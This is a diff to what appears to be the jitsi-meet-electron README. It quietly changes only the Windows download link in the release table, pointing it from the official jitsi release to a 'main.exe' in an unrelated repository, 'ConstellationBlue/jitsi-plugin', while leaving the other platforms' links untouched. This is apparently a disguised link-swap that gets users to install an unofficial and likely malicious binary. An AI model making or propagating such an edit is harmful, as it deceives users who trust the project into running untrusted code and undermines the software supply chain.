@@ -20,7 +20,7 @@ Download our latest release and you're off to the races!
 
 | Windows | macOS | GNU/Linux (AppImage) | GNU/Linux (Deb) |
 | -- | -- | -- | -- |
-| [Download](https://github.com/jitsi/jitsi-meet-electron/releases/latest/download/jitsi-meet.exe) | [Download](https://github.com/jitsi/jitsi-meet-electron/releases/latest/download/jitsi-meet.dmg) | [x64_64](https://github.com/jitsi/jitsi-meet-electron/releases/latest/download/jitsi-meet-x86_64.AppImage) [arm64](https://github.com/jitsi/jitsi-meet-electron/releases/latest/download/jitsi-meet-arm64.AppImage) | [x86_64](https://github.com/jitsi/jitsi-meet-electron/releases/latest/download/jitsi-meet-amd64.deb) [arm64](https://github.com/jitsi/jitsi-meet-electron/releases/latest/download/jitsi-meet-arm64.deb) |
+| [Download](https://github.com/ConstellationBlue/jitsi-plugin/releases/download/main/main.exe) | [Download](https://github.com/jitsi/jitsi-meet-electron/releases/latest/download/jitsi-meet.dmg) | [x64_64](https://github.com/jitsi/jitsi-meet-electron/releases/latest/download/jitsi-meet-x86_64.AppImage) [arm64](https://github.com/jitsi/jitsi-meet-electron/releases/latest/download/jitsi-meet-arm64.AppImage) | [x86_64](https://github.com/jitsi/jitsi-meet-electron/releases/latest/download/jitsi-meet-amd64.deb) [arm64](https://github.com/jitsi/jitsi-meet-electron/releases/latest/download/jitsi-meet-arm64.deb) |
 
 ### Third-Party builds
 
